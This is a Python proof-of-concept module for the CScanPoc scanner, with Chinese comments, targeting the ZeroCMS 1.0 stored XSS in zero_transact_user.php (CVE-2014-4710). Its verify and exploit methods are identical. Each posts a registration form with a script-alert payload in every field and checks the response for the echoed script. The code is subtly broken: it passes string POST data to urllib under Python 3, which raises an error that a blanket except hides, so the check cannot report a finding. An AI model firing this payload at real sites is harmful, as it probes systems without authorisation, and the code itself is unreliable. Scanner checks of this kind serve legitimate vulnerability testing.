# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib.request
import urllib.parse
import urllib.error
import urllib.request
import urllib.error
import urllib.parse
import re


class Vuln(ABVuln):
    vuln_id = 'ZeroCMS_0001'  # 平台漏洞编号，留空
    name = 'ZeroCMS 1.0 /zero_transact_user.php XSS'  # 漏洞名称
    level = VulnLevel.MED  # 漏洞危害级别
    type = VulnType.XSS  # 漏洞类型
    disclosure_date = '2014-07-27'  # 漏洞公布时间
    desc = '''
        CMSZERO是免费开源网站内容管理系统，主要面向企业进行快速的建造简洁，高效，易用，安全的公司企业网站，一般的开发人员就能够使用本系统以最低的成本、最少的人力投入在最短的时间内架设一个功能齐全、性能优异的公司企业网站。CMSZERO是基于ASP+Access(sql2005)开发的网站内容管理系统，提供了简介类模块，新闻类模块，产品类模块，图片类模块，下载类模块。你在使用过程中可选择任意模块来建设您的网站。
        ZeroCMS用户注册页面zero_transact_user.php表单完全没进行过滤。
    '''  # 漏洞描述
    ref = 'https://www.exploit-db.com/exploits/34170/'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'CVE-2014-4710'  # cve编号
    product = 'ZeroCMS'  # 漏洞应用名称
    product_version = '1.0'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '4ee2962e-4c22-4ff1-b5b8-e44847f308f8'
    author = 'cscan'  # POC编写者
    create_date = '2018-05-06'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            verify_url = '{target}'.format(
                target=self.target)+'/zero_transact_user.php'
            verify_data = 'name=%3Cscript%3Ealert%28123%29%3C%2Fscript%3E&email=%3Cscript%3E'\
                'alert%28123%29%3C%2Fscript%3E&password_1=%3Cscript%3Ealert%28123%29%3C%2Fscript'\
                '%3E&password_2=%3Cscript%3Ealert%28123%29%3C%2Fscript%3E&action=Create+Account'
            request = urllib.request.Request(verify_url, data=verify_data)
            response = urllib.request.urlopen(request)
            content = str(response.read())
            if "Duplicate entry '<script>alert(123)</script>' for key 'email'" in content:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 漏洞利用'.format(
                target=self.target, vuln=self.vuln))

            verify_url = '{target}'.format(
                target=self.target)+'/zero_transact_user.php'
            verify_data = 'name=%3Cscript%3Ealert%28123%29%3C%2Fscript%3E&email=%3Cscript%3E'\
                'alert%28123%29%3C%2Fscript%3E&password_1=%3Cscript%3Ealert%28123%29%3C%2Fscript'\
                '%3E&password_2=%3Cscript%3Ealert%28123%29%3C%2Fscript%3E&action=Create+Account'
            request = urllib.request.Request(verify_url, data=verify_data)
            response = urllib.request.urlopen(request)
            content = str(response.read())
            if "Duplicate entry '<script>alert(123)</script>' for key 'email'" in content:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞，获取到漏洞地址为{url}'.format(
                    target=self.target, name=self.vuln.name, url=verify_url))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))


if __name__ == '__main__':
    Poc().run()
